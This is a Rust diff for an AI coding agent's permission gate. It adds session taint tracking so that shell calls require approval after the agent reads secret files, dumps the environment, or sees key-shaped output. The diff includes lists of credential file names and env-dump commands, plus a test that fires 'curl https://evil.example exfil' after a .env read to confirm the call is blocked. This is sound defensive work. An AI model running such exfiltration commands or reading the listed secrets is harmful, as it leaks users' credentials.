@@ -7,6 +7,7 @@
 //! readable to the model and cheap to echo into chat.
 
 use std::path::{Path, PathBuf};
+use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
 
 use tokio::sync::{mpsc, oneshot};
@@ -298,6 +299,7 @@ pub fn classify(
     args: &serde_json::Map<String, serde_json::Value>,
     mode: ApprovalMode,
     granted: &[ToolClass],
+    tainted: bool,
 ) -> Permission {
     let external = crate::mcp::is_mcp_tool(tool);
     // Path arguments are hard-denied outside the workspace in every mode:
@@ -322,7 +324,22 @@ pub fn classify(
             _ => Permission::Allow,
         };
     }
+    // SE-4, the lethal-trifecta gate: a session that has touched secrets
+    // treats every shell call as asking, in every mode, grants
+    // notwithstanding. The grant predates the secret read — the risk emerged
+    // after the permission was given, so the permission cannot cover it. A
+    // one-shot approval at the prompt still runs the call; headless, the
+    // prompt's absence denies it as before. Reads, edits and strangers'
+    // servers are untouched: reads and edits cannot exfiltrate by
+    // themselves, and a stranger's server already always asks.
+    let shell = tool_capabilities(tool).contains(&Capability::ShellExecute);
+    if tainted && shell && decision != Permission::Deny {
+        return Permission::Ask;
+    }
     let class = tool_class(tool);
+    // Unreachable for a tainted shell: the rule above already returned Ask,
+    // so a grant given before the secrets were read cannot cover a call
+    // made after.
     if decision == Permission::Ask && granted.contains(&class) {
         Permission::Allow
     } else {
@@ -2999,6 +3016,72 @@ async fn execute_tool_call_plan(
     }
 }
 
+/// Whether a basename is secret-named (SE-4): private keys, credential
+/// stores, and dotenv files. Matched on the name alone, because the gate
+/// judges the call before it runs and cannot read the content first.
+fn secret_basename(name: &str) -> bool {
+    let name = name.to_lowercase();
+    name.starts_with("id_rsa")
+        || name.starts_with("id_ed25519")
+        || name.starts_with("id_ecdsa")
+        || name.starts_with("id_dsa")
+        || name.ends_with(".pem")
+        || name.ends_with(".key")
+        || name.ends_with(".p12")
+        || name.ends_with(".pfx")
+        || name == ".env"
+        || name.starts_with(".env.")
+        || name.contains("credential")
+        || name.contains("secret")
+        || name.contains("passwd")
+}
+
+/// Whether a path reaches secrets: under `~/.ssh` or `~/.xencode`, or
+/// secret-named itself. Lexical only — existence is irrelevant, and touching
+/// the filesystem to judge a path the gate may refuse would be backwards.
+/// `home` is passed in so tests never read the real one.
+pub fn sensitive_path(home: Option<&Path>, root: &Path, path: &Path) -> bool {
+    let absolute = normalize(&if path.is_absolute() {
+        path.to_path_buf()
+    } else {
+        root.join(path)
+    });
+    if absolute
+        .file_name()
+        .and_then(|name| name.to_str())
+        .is_some_and(secret_basename)
+    {
+        return true;
+    }
+    let Some(home) = home else {
+        return false;
+    };
+    [".ssh", ".xencode"].iter().any(|dir| {
+        let base = normalize(&home.join(dir));
+        absolute.starts_with(&base)
+    })
+}
+
+/// Whether a shell command dumps the environment by design (`env`,
+/// `printenv`, bare `set`, `export -p`, each optionally under one `sudo`).
+/// The output still has to carry secrets to matter — this only names the
+/// commands whose whole point is printing them — but a bare `env` in a
+/// session taints on intent, because waiting for the output to prove it
+/// would taint one call too late.
+fn env_dump_command(command: &str) -> bool {
+    let mut words = command.split_whitespace();
+    let mut first = words.next().unwrap_or("");
+    if first == "sudo" {
+        first = words.next().unwrap_or("");
+    }
+    match first {
+        "env" | "printenv" => true,
+        "set" => words.next().is_none(),
+        "export" => words.next() == Some("-p"),
+        _ => false,
+    }
+}
+
 /// What the loop needs to gate a call before running it: the configured
 /// mode, the session grants — shared with `App` so an "always allow" answer
 /// is still in force for the next message — and the channel the approval
@@ -3044,6 +3127,11 @@ pub struct ApprovalCtx {
     /// Built fresh per run by `App::approval_ctx`, so the list a run's own tool
     /// tasks append to is that run's and nobody else's.
     pub approvals: Arc<std::sync::Mutex<Vec<xencode_context_rs::ApprovalRow>>>,
+    /// Whether this session has touched secrets (SE-4). Shared across the
+    /// session's runs like the grants above — deliberately one coarse bit,
+    /// not per-variable taint, because cross-turn fine tracking is leaky and
+    /// a leaky gate is theater. Once set it stays set for the session.
+    pub taint: Arc<AtomicBool>,
 }
 
 impl ApprovalCtx {
@@ -3052,6 +3140,46 @@ impl ApprovalCtx {
             .lock()
             .map(|grants| grants.clone())
             .unwrap_or_default()
+    }
+
+    /// Whether this session has touched secrets (SE-4). Read at every
+    /// classification, so a shell call after a secret read asks no matter
+    /// what the mode or the session grants say.
+    pub fn tainted(&self) -> bool {
+        self.taint.load(Ordering::Relaxed)
+    }
+
+    /// Mark the session tainted. One way: exposure cannot be unseen, and a
+    /// gate that forgets is a gate that exfiltrates on the second try.
+    pub fn taint(&self) {
+        self.taint.store(true, Ordering::Relaxed);
+    }
+
+    /// Inspect a finished tool call for secret exposure (SE-4) and taint the
+    /// session when it finds any. Three shapes: a file tool touching a
+    /// sensitive path, a command that dumps the environment by design, and
+    /// secret-shaped text in anything a tool returned (a `cat` of a key
+    /// reaches no sensitive path of its own, but its output is the key).
+    /// Over-approximation is the design: taint buys a prompt, not a refusal,
+    /// and a missed secret costs an exfiltration.
+    pub fn note_tool_result(&self, root: &Path, call: &ToolCall, result: &str) {
+        if self.tainted() {
+            return;
+        }
+        let home = dirs::home_dir();
+        let args = call.arguments_object();
+        let path_touched = matches!(
+            call.name.as_str(),
+            "read_file" | "edit_file" | "write_file" | "list_dir" | "search_files"
+        ) && ["path", "cwd"].iter().any(|key| {
+            arg_str(&args, key)
+                .is_some_and(|p| sensitive_path(home.as_deref(), root, Path::new(&p)))
+        });
+        let env_dumped = matches!(call.name.as_str(), "run_command" | "background_start")
+            && arg_str(&args, "command").is_some_and(env_dump_command);
+        if path_touched || env_dumped || xencode_context_rs::trace::contains_secret(result) {
+            self.taint();
+        }
     }
 
     fn grant(&self, class: ToolClass) {
@@ -3186,6 +3314,10 @@ async fn run_and_checkpoint(
         result.push('\n');
         result.push_str(&text);
     }
+    // SE-4: what just ran may have touched secrets — a key file, an env
+    // dump, secret-shaped output. The session is tainted now if so, and
+    // every later shell call asks, whatever the mode says.
+    ctx.note_tool_result(root, call, &result);
     result
 }
 
@@ -3224,7 +3356,14 @@ pub async fn execute_tool_call_approved(
             return err(format!("{} was not carried out: {reason}", call.name));
         }
     };
-    match classify(root, &call.name, &args, ctx.mode, &ctx.granted()) {
+    match classify(
+        root,
+        &call.name,
+        &args,
+        ctx.mode,
+        &ctx.granted(),
+        ctx.tainted(),
+    ) {
         // Refused without asking: the path is outside what the agent may
         // touch in any mode, so a prompt would only invite a mistake.
         Permission::Deny => FORBIDDEN_RESULT.to_string(),
@@ -4293,20 +4432,275 @@ mod tests {
         }
     }
 
+    /// SE-4: a session that has touched secrets treats every shell call as
+    /// asking, in every mode — including past a session grant, which predates
+    /// the secret read and cannot cover what came after it.
+    #[test]
+    fn tainted_shell_asks_everywhere_and_ignores_grants() {
+        let root = Path::new(".");
+        let none = args_of(serde_json::json!({}));
+        for mode in [
+            ApprovalMode::Ask,
+            ApprovalMode::EditAllow,
+            ApprovalMode::AllAllow,
+        ] {
+            assert_eq!(
+                classify(root, "run_command", &none, mode, &[], true),
+                Permission::Ask,
+                "a tainted shell asks in {mode:?}"
+            );
+            assert_eq!(
+                classify(root, "run_command", &none, mode, &[ToolClass::Shell], true),
+                Permission::Ask,
+                "a grant given before the secret read covers nothing after it ({mode:?})"
+            );
+        }
+        // Without taint nothing changes: all-allow still allows.
+        assert_eq!(
+            classify(
+                root,
+                "run_command",
+                &none,
+                ApprovalMode::AllAllow,
+                &[ToolClass::Shell],
+                false
+            ),
+            Permission::Allow,
+            "untainted grants keep working"
+        );
+    }
+
+    /// Taint poisons shell and shell alone: reads and edits cannot
+    /// exfiltrate by themselves, and a stranger's server already always
+    /// asks, tainted or not.
+    #[test]
+    fn taint_leaves_reads_edits_and_strangers_exactly_where_they_were() {
+        let root = Path::new(".");
+        let none = args_of(serde_json::json!({}));
+        assert_eq!(
+            classify(root, "read_file", &none, ApprovalMode::Ask, &[], true),
+            Permission::Allow
+        );
+        assert_eq!(
+            classify(
+                root,
+                "write_file",
+                &none,
+                ApprovalMode::EditAllow,
+                &[],
+                true
+            ),
+            Permission::Allow
+        );
+        assert_eq!(
+            classify(
+                root,
+                "mcp__server__prompt",
+                &none,
+                ApprovalMode::AllAllow,
+                &[],
+                true
+            ),
+            Permission::Ask
+        );
+    }
+
+    /// Sensitive paths: the home key dirs, secret-named basenames, and
+    /// nothing else. `home` is passed in so no test reads the real one.
+    #[test]
+    fn sensitive_paths_cover_keys_env_and_dotdirs() {
+        use std::path::PathBuf;
+        let home = PathBuf::from("/home/tester");
+        let root = PathBuf::from("/home/tester/proj");
+        let yes = [
+            "/home/tester/.ssh/id_rsa",
+            "/home/tester/.ssh/known_hosts",
+            "/home/tester/.xencode/config.json",
+            "/home/tester/proj/.env",
+            "/home/tester/proj/.env.local",
+            "/home/tester/proj/deploy_key.pem",
+            "/home/tester/proj/tls.key",
+            "/home/tester/proj/credentials.json",
+        ];
+        for path in yes {
+            assert!(
+                sensitive_path(Some(&home), &root, Path::new(path)),
+                "{path} must taint"
+            );
+        }
+        // Relative to the workspace root, as tool arguments arrive.
+        assert!(sensitive_path(Some(&home), &root, Path::new(".env")));
+        // Over-broad on purpose, and pinned so: `secret-santa.txt` taints
+        // because it says "secret". Taint buys a prompt, not a refusal, and
+        // a missed key costs an exfiltration — the wrong side to err on.
+        assert!(sensitive_path(
+            Some(&home),
+            &root,
+            Path::new("secret-santa.txt")
+        ));
+        for path in [
+            "/home/tester/proj/src/main.rs",
+            "/home/tester/.config/xencode/config.json",
+        ] {
+            assert!(
+                !sensitive_path(Some(&home), &root, Path::new(path)),
+                "{path} must not taint"
+            );
+        }
+        // Basenames taint even where there is no home at all.
+        assert!(sensitive_path(None, &root, Path::new(".env")));
+        assert!(!sensitive_path(None, &root, Path::new("src/main.rs")));
+    }
+
+    /// Commands that dump the environment by design — and only those.
+    #[test]
+    fn env_dump_is_named_commands_not_substrings() {
+        assert!(env_dump_command("env"));
+        assert!(env_dump_command("  sudo env  "));
+        assert!(env_dump_command("printenv OPENAI_API_KEY"));
+        assert!(env_dump_command("set"));
+        assert!(env_dump_command("export -p"));
+        assert!(!env_dump_command("set -o pipefail"));
+        assert!(!env_dump_command("export FOO=1"));
+        assert!(!env_dump_command("echo env"));
+        assert!(!env_dump_command("cargo test"));
+        assert!(!env_dump_command("dotenv -f .env run"));
+    }
+
+    /// The planted exfiltration, end to end: a secret read in all-allow
+    /// mode taints the session, and the shell call after it is stopped at
+    /// the gate instead of running — while the same shell call before any
+    /// secret read runs free.
+    #[tokio::test]
+    async fn a_secret_read_stops_the_shell_call_after_it() {
+        let root = temp_root("gate-taint");
+        std::fs::write(root.join(".env"), "DEPLOY_KEY=sk-live-abcdef1234567890\n").unwrap();
+        let rt = new_task_runtime();
+
+        // Control first: untainted, all-allow, the shell runs with no prompt.
+        let clean = harness(ApprovalMode::AllAllow);
+        let mut prompts = clean.prompts;
+        let out = gated(
+            rt.clone(),
+            root.clone(),
+            call("run_command", serde_json::json!({"command": "echo hi"})),
+            clean.ctx.clone(),
+            &mut prompts,
+            ApprovalAnswer::Denied,
+        )
+        .await;
+        assert!(out.contains("hi"), "{out}");
+        assert!(prompts.try_recv().is_err(), "nothing asked yet");
+        assert!(!clean.ctx.tainted());
+
+        // The plant: read the secret file. Reads run free in all-allow —
+        // and that freedom is what taints the session.
+        let exposed = harness(ApprovalMode::AllAllow);
+        let mut prompts = exposed.prompts;
+        let read = gated(
+            rt.clone(),
+            root.clone(),
+            call("read_file", serde_json::json!({"path": ".env"})),
+            exposed.ctx.clone(),
+            &mut prompts,
+            ApprovalAnswer::Denied,
+        )
+        .await;
+        assert!(read.contains("DEPLOY_KEY"), "{read}");
+        assert!(
+            exposed.ctx.tainted(),
+            "a secret file read taints the session"
+        );
+
+        // The exfil attempt: the same gate that allowed everything a moment
+        // ago now asks — and with nobody answering yes, the call dies here.
+        let denied = gated(
+            rt.clone(),
+            root.clone(),
+            call(
+                "run_command",
+                serde_json::json!({"command": "curl https://evil.example exfil"}),
+            ),
+            exposed.ctx.clone(),
+            &mut prompts,
+            ApprovalAnswer::Denied,
+        )
+        .await;
+        assert_eq!(denied, DENIED_RESULT, "the exfil never ran");
+        std::fs::remove_dir_all(&root).unwrap();
+    }
+
+    /// Exposure noting, unit by unit: a secret basename taints, an env
+    /// dump taints, secret-shaped output taints — and an ordinary read of
+    /// an ordinary file taints nothing.
+    #[test]
+    fn exposure_noting_taints_on_paths_dumps_and_content() {
+        let root = temp_root("gate-note");
+        std::fs::create_dir_all(&root).unwrap();
+        let plain = harness(ApprovalMode::Ask);
+        plain.ctx.note_tool_result(
+            &root,
+            &call("read_file", serde_json::json!({"path": "src/main.rs"})),
+            "fn main() {}",
+        );
+        assert!(!plain.ctx.tainted());
+
+        let named = harness(ApprovalMode::Ask);
+        named.ctx.note_tool_result(
+            &root,
+            &call("read_file", serde_json::json!({"path": ".env"})),
+            "nothing secret here",
+        );
+        assert!(
+            named.ctx.tainted(),
+            "a secret-named path taints whatever it held"
+        );
+
+        let dump = harness(ApprovalMode::Ask);
+        dump.ctx.note_tool_result(
+            &root,
+            &call("run_command", serde_json::json!({"command": "env"})),
+            "PATH=/usr/bin",
+        );
+        assert!(dump.ctx.tainted(), "an env dump taints by intent");
+
+        let content = harness(ApprovalMode::Ask);
+        content.ctx.note_tool_result(
+            &root,
+            &call(
+                "run_command",
+                serde_json::json!({"command": "cat notes.txt"}),
+            ),
+            "key is sk-live-abcdef1234567890, do not share",
+        );
+        assert!(
+            content.ctx.tainted(),
+            "a key in the output taints though the path was innocent"
+        );
+        std::fs::remove_dir_all(&root).unwrap();
+    }
+
     #[test]
     fn classify_asks_per_mode_and_grants_shortcut_the_prompt() {
         let root = Path::new(".");
         let none = args_of(serde_json::json!({}));
         assert_eq!(
-            classify(root, "repo_advise", &none, ApprovalMode::Ask, &[]),
+            classify(root, "repo_advise", &none, ApprovalMode::Ask, &[], false),
             Permission::Allow
         );
         assert_eq!(
-            classify(root, "write_file", &none, ApprovalMode::Ask, &[]),
+            classify(root, "write_file", &none, ApprovalMode::Ask, &[], false),
             Permission::Ask
         );
         assert_eq!(
-            classify(root, "write_file", &none, ApprovalMode::EditAllow, &[]),
+            classify(
+                root,
+                "write_file",
+                &none,
+                ApprovalMode::EditAllow,
+                &[],
+                false
+            ),
             Permission::Allow,
             "edit-allow auto-approves file edits"
         );
@@ -4316,13 +4710,21 @@ mod tests {
                 "background_start",
                 &none,
                 ApprovalMode::EditAllow,
-                &[]
+                &[],
+                false
             ),
             Permission::Ask,
             "edit-allow still prompts for shell"
         );
         assert_eq!(
-            classify(root, "background_start", &none, ApprovalMode::AllAllow, &[]),
+            classify(
+                root,
+                "background_start",
+                &none,
+                ApprovalMode::AllAllow,
+                &[],
+                false
+            ),
             Permission::Allow
         );
         assert_eq!(
@@ -4331,7 +4733,8 @@ mod tests {
                 "background_start",
                 &none,
                 ApprovalMode::Ask,
-                &[ToolClass::Shell]
+                &[ToolClass::Shell],
+                false
             ),
             Permission::Allow,
             "a session grant replaces the prompt for that class"
@@ -4342,7 +4745,8 @@ mod tests {
                 "write_file",
                 &none,
                 ApprovalMode::Ask,
-                &[ToolClass::Shell]
+                &[ToolClass::Shell],
+                false
             ),
             Permission::Ask,
             "a shell grant must not unlock edits"
@@ -4359,14 +4763,14 @@ mod tests {
             ApprovalMode::AllAllow,
         ] {
             assert_eq!(
-                classify(&root, "write_file", &outside, mode, &[]),
+                classify(&root, "write_file", &outside, mode, &[], false),
                 Permission::Deny,
                 "all-allow never means anywhere on disk ({mode:?})"
             );
         }
         let git = args_of(serde_json::json!({"path": "repo/.git/config"}));
         assert_eq!(
-            classify(&root, "edit_file", &git, ApprovalMode::AllAllow, &[]),
+            classify(&root, "edit_file", &git, ApprovalMode::AllAllow, &[], false),
             Permission::Deny
         );
         // background_start's cwd gets the same treatment; an in-root cwd does not.
@@ -4377,13 +4781,21 @@ mod tests {
                 "background_start",
                 &bad_cwd,
                 ApprovalMode::AllAllow,
-                &[]
+                &[],
+                false
             ),
             Permission::Deny
         );
         let good_cwd = args_of(serde_json::json!({"command": "ls", "cwd": "sub/dir"}));
         assert_eq!(
-            classify(&root, "background_start", &good_cwd, ApprovalMode::Ask, &[]),
+            classify(
+                &root,
+                "background_start",
+                &good_cwd,
+                ApprovalMode::Ask,
+                &[],
+                false
+            ),
             Permission::Ask
         );
     }
@@ -4509,7 +4921,7 @@ mod tests {
         );
         for mode in [ApprovalMode::Ask, ApprovalMode::EditAllow] {
             assert_eq!(
-                classify(&root, "run_command", &none, mode, &[]),
+                classify(&root, "run_command", &none, mode, &[], false),
                 Permission::Ask,
                 "a headless grant must not silence the interactive prompt ({mode:?})"
             );
@@ -4522,7 +4934,14 @@ mod tests {
             Headless::Refused { .. }
         ));
         assert_eq!(
-            classify(&root, "run_command", &outside, ApprovalMode::AllAllow, &[]),
+            classify(
+                &root,
+                "run_command",
+                &outside,
+                ApprovalMode::AllAllow,
+                &[],
+                false
+            ),
             Permission::Deny
         );
     }
@@ -4603,6 +5022,7 @@ mod tests {
                 &args(),
                 ApprovalMode::AllAllow,
                 &[ToolClass::Edit],
+                false
             ),
             Permission::Deny,
             "even all-allow plus a session grant must not write into a dependency's source"
@@ -4618,6 +5038,7 @@ mod tests {
                 &args_of(serde_json::json!({"command": "ls", "cwd": "/tmp"})),
                 ApprovalMode::AllAllow,
                 &[],
+                false
             ),
             Permission::Deny
         );
@@ -4667,6 +5088,7 @@ mod tests {
                 &args_of(serde_json::json!({"path": format!("crate:{name}/Cargo.toml")})),
                 ApprovalMode::Ask,
                 &[],
+                false
             ),
             Permission::Allow,
             "the policy has to open the same door the executor reads through"
@@ -4740,7 +5162,14 @@ mod tests {
 
         let args = args_of(serde_json::json!({"crate": name.clone()}));
         assert_eq!(
-            classify(&workspace, "read_docs", &args, ApprovalMode::Ask, &[]),
+            classify(
+                &workspace,
+                "read_docs",
+                &args,
+                ApprovalMode::Ask,
+                &[],
+                false
+            ),
             Permission::Allow,
             "reading documentation opens no file the model could not already read"
         );
@@ -4984,7 +5413,14 @@ patched = ["{fixed}"]
         let workspace = this_workspace();
         let args = args_of(serde_json::json!({"crate": "chrono"}));
         assert_eq!(
-            classify(&workspace, "lookup_advisory", &args, ApprovalMode::Ask, &[]),
+            classify(
+                &workspace,
+                "lookup_advisory",
+                &args,
+                ApprovalMode::Ask,
+                &[],
+                false
+            ),
             Permission::Allow,
             "reading a downloaded text file opens nothing the model could not already read"
         );
@@ -5864,6 +6300,7 @@ patched = ["{fixed}"]
                 online_docs: false,
                 session_id: None,
                 approvals: std::sync::Arc::new(std::sync::Mutex::new(Vec::new())),
+                taint: std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false)),
             },
             prompts: rx,
         }
@@ -6348,6 +6785,7 @@ patched = ["{fixed}"]
                 online_docs: false,
                 session_id: None,
                 approvals: std::sync::Arc::new(std::sync::Mutex::new(Vec::new())),
+                taint: std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false)),
             };
             let content = format!("written in turn {turn}\n");
             let result = execute_tool_call_approved(
